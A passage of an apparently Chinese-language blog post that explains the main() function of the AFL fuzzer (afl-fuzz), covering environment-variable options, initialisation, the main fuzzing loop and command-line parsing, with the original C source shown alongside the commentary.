class="keyword">if</span> (qemu_mode)  <span class="built_in">FATAL</span>(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>)) &#123;</span><br><span class="line">    hang_tmout = <span class="built_in">atoi</span>(<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!hang_tmout) <span class="built_in">FATAL</span>(<span class="string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">2</span> &amp;&amp; no_forkserver)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_LD_PRELOAD&quot;</span>))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">save_cmdline</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fix_up_banner</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_if_tty</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_core_count</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  <span class="built_in">bind_to_free_cpu</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_crash_handling</span>();</span><br><span class="line">  <span class="built_in">check_cpu_governor</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_post</span>();</span><br><span class="line">  <span class="built_in">setup_shm</span>();</span><br><span class="line">  <span class="built_in">init_count_class16</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_dirs_fds</span>();</span><br><span class="line">  <span class="built_in">read_testcases</span>();</span><br><span class="line">  <span class="built_in">load_auto</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pivot_inputs</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (extras_dir) <span class="built_in">load_extras</span>(extras_dir);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) <span class="built_in">find_timeout</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">detect_file_args</span>(argv + optind + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!out_file) <span class="built_in">setup_stdio_file</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_binary</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line">  start_time = <span class="built_in">get_cur_time</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)</span><br><span class="line">    use_argv = <span class="built_in">get_qemu_argv</span>(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    use_argv = argv + optind;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">perform_dry_run</span>(use_argv);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">show_init_stats</span>();</span><br><span class="line"></span><br><span class="line">  seek_to = <span class="built_in">find_start_position</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">save_auto</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Woop woop woop */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">4</span>);</span><br><span class="line">    start_time += <span class="number">4000</span>;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line"></span><br><span class="line">      queue_cycle++;</span><br><span class="line">      current_entry     = <span class="number">0</span>;</span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">      queue_cur         = queue;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        <span class="built_in">ACTF</span>(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">         recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">getenv</span>(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    skipped_fuzz = <span class="built_in">fuzz_one</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we stopped programmatically, we kill the forkserver and the current runner. </span></span><br><span class="line"><span class="comment">     If we stopped manually, this is done by the signal handler. */</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">      <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Now that we&#x27;ve killed the forkserver, we wait for it to be able to get rusage stats. */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_bitmap</span>();</span><br><span class="line">  <span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">save_auto</span>();</span><br><span class="line"></span><br><span class="line">stop_fuzzing:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">get_cur_time</span>() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fclose</span>(plot_file);</span><br><span class="line">  <span class="built_in">destroy_queue</span>();</span><br><span class="line">  <span class="built_in">destroy_extras</span>();</span><br><span class="line">  <span class="built_in">ck_free</span>(target_path);</span><br><span class="line">  <span class="built_in">ck_free</span>(sync_id);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">alloc_report</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !AFL_LIB *</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br></pre></td></tr></table></figure><p>因为是整个AFL的核心区域，函数长度有点长，我们从以下几个部分分析</p><h3 id="主要数据结构、变量和初始化"><a href="#主要数据结构、变量和初始化" class="headerlink" title="主要数据结构、变量和初始化"></a>主要数据结构、变量和初始化</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s32 opt;                        <span class="comment">// getopt选项解析</span></span><br><span class="line">u64 prev_queued = <span class="number">0</span>;           <span class="comment">// 上一轮队列中的测试用例数</span></span><br><span class="line">u32 sync_interval_cnt = <span class="number">0</span>,      <span class="comment">// 同步间隔计数器</span></span><br><span class="line">    seek_to;                   <span class="comment">// 队列中的起始位置</span></span><br><span class="line">u8  *extras_dir = <span class="number">0</span>;           <span class="comment">// 额外字典目录</span></span><br><span class="line">u8  mem_limit_given = <span class="number">0</span>;       <span class="comment">// 内存限制是否设置</span></span><br><span class="line">u8  exit_1 = !!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_BENCH_JUST_ONE&quot;</span>); <span class="comment">// 基准测试模式</span></span><br><span class="line"><span class="type">char</span>** use_argv;               <span class="comment">// 实际使用的命令行参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">timeval</span> tv;             <span class="comment">// 时间结构</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">timezone</span> tz;            <span class="comment">// 时区结构</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 显示版本信息</span></span><br><span class="line"><span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 设置文档路径</span></span><br><span class="line">doc_path = <span class="built_in">access</span>(DOC_PATH, F_OK) ? <span class="string">&quot;docs&quot;</span> : DOC_PATH;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 初始化随机数生成器</span></span><br><span class="line"><span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line"><span class="built_in">srandom</span>(tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>());</span><br></pre></td></tr></table></figure><p>跟afl-as使用相同的策略，确保整个AFL工具的随机性一致</p><h3 id="命令行解析"><a href="#命令行解析" class="headerlink" title="命令行解析"></a>命令行解析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">        <span class="comment">// 各种选项处理</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">  in_dir = optarg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (out_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">  out_dir = optarg;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">    u8* c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">    sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">      *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">          !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">          master_max &gt; <span class="number">1000000</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">  sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (out_file) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">  out_file = optarg;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (extras_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">  extras_dir = optarg;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">    u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">        optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">    u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem_limit_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">    mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      mem_limit = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">        optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:  <span class="built_in">FATAL</span>(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cpu_to_bind_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">    cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">        optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">  skip_deterministic = <span class="number">1</span>;</span><br><span class="line">  use_splicing = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">     an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">     to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">     found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">     by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     I only used this 